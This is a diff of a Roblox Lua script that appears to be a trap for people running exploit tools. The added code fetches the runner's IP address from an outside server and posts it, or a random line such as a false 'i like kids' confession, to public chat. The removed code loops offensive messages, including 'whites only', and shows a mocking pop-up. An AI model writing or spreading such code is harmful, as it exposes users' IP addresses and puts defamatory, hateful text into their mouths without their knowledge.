@@ -1,44 +1,12 @@
-
-function realChat(wordstosay)
-   game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(wordstosay, "All")
-end
-
-local maxIndex = 5 -- // edit this to how many strings are in the listofmemes module
-
-local listofmemes = {
-   " yuh yuh yuh im a rappr folow me on souncloud bruh yuh also im a hacker!! jjsploit on top",
-   "jjsploit on top ezzz wizzed",
-   "im a hacker jjsploit on top",
-   "whites only",
-   "and i oop skskskksks",
+local msgs = {
+    'my ip is ' .. game:HttpGet('https://entity.cool/whitelist/getip'),
+    'jjsploit winning',
+    'why my jjexploit is crash',
+    'pls robux',
+    'i like kids',
+    'synapse is bad, jjsploit winning'
 }
-
-local Index = 0
-
-while true do
-   wait(0.5)
-   Index = Index + 1
-   if Index >= maxIndex then
-       Index = Index - 4 -- // really shitty way to reroute this shit but i honestly dont care its 10PM rn
-   end
-   realChat(listofmemes[Index])
-end
-
-local StarterGui = game:GetService("StarterGui") 
-local bindable = Instance.new("BindableFunction")
-
-function bindable.OnInvoke(response)
-    print(response .. " LOOOOL")
-end
-
-StarterGui:SetCore("SendNotification", {
-	Title = "Sucks to be you",
-	Text = "So why are you here",
-	Duration = 5,
-	Callback = bindable,
-	Button1 = "just want it free",
-	Button2 = "skid"
-})
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msgs[math.random(1, #msgs)], "ALL")
 
 local StarterGui = game:GetService("StarterGui") 
 local bindable = Instance.new("BindableFunction")
